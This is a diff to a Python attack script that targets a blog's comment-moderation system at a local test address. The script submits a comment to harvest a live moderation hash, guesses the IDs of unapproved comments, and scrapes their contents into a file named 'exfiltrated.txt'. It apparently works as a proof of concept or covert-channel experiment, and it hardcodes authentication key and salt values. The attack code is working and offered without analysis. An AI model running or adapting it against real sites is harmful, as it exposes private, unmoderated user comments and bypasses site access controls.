@@ -5,13 +5,18 @@ from bs4 import BeautifulSoup
 import urllib.parse
 import hmac
 import sys
+import datetime
+
+random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))
 
 AUTH_KEY = "0c008b2f27fbaf5e9acaaa08bf251fc98c6d38a1"
 AUTH_SALT = "ea30c9849bfd208c9890cbf7bb56f59a20b52c4f"
 target_blog = "http://127.0.0.3/"
 sync_channel = "2021/08/06/hello-world/"
 
-time_slot = "4:44"
+server_time_slot = "2:22"
+client_time_slot = "1:11"
+
 comment_index = 0
 prev_unapproved_index = 0
 
@@ -100,11 +105,30 @@ def get_previous_valid_timeslot_date(current_datetime, time_slot):
 
     return target_date
 
+def get_moderation_hash_from_url(url):
+    url_parsed = urllib.parse.urlparse(url)
+    queries = urllib.parse.parse_qs(url_parsed.query)
+
+    if 'moderation-hash' in queries:
+        return queries['moderation-hash'][0]
+    else:
+        return None
+
+def get_moderation_hash_at_current_time():
+    random_string = generate_random_string(10)
+    response = submit_comment(random_string + ": Getting_moderation_hash")
+
+    response_splitted = response.split("\n")
+    response_details = response_splitted[-1]
+
+    response_splitted = response_details.split(",")
+    url = response_splitted[1]
+    return get_moderation_hash_from_url(url)
+
 clients = []
 for i in range(1, 4):
     client = Client()
     i_string = str(i)
-    client.time_slot = i_string + ":" + i_string + i_string
     clients.append(client)
 
 if prev_unapproved_index == 0:
@@ -112,20 +136,20 @@ if prev_unapproved_index == 0:
 
 loop_counter = 99
 while(loop_counter > 0):
-    print("[INFO] Delaying to next timeslot. " + time_slot);
-    delay_to_timeslot(time_slot)
+    print("[INFO] Delaying to client timeslot. " + client_time_slot);
+    delay_to_timeslot(client_time_slot)
+    current_hash = get_moderation_hash_at_current_time()
+
+    print("[INFO] Current hash is: " + current_hash)
+    print("[INFO] Delaying to server timeslot. " + server_time_slot);
+
+    delay_to_timeslot(server_time_slot)
     unapproved_index = get_current_unapproved_index()
 
     for client in clients:
-        timeslot_date = get_previous_valid_timeslot_date(datetime.datetime.utcnow(), client.time_slot)
-        timeslot_date = str(timeslot_date).split(".")[0]
-
-        computed_hash = compute_moderation_hash(timeslot_date)
-        print("[INFO] Computed hash: " + computed_hash)
-
-        for index_offset in range(1, len(clients) + 1):
+        for index_offset in range(1, len(clients) + 1 + 1):
             current_unapproved_index = prev_unapproved_index + index_offset
-            url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + computed_hash + "&url=" + str(current_unapproved_index)
+            url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
             print("[INFO] Checking URL: " + url);
 
             response_html = fetch_comments_page(url)
@@ -136,14 +160,14 @@ while(loop_counter > 0):
                 elem = elems[-1]
                 if elem and elem.string:
                     to_write = str(datetime.datetime.utcnow()) + ": "
-                    to_write += "Extracted data with timeslot of " + client.time_slot + ": " + str(elem.string).strip() + "\n"
+                    to_write += "Extracted data with timeslot of " + client_time_slot + ": " + str(elem.string).strip() + "\n"
                     print("[INFO] " + to_write);
                     f = open("exfiltrated.txt", "a")
                     f.write(to_write)
                     f.close()
                     break
             else:
-                print("[INFO] No comment for moderation for " + client.time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
+                print("[INFO] No comment for moderation for " + client_time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
 
     prev_unapproved_index = unapproved_index
     loop_counter += 1
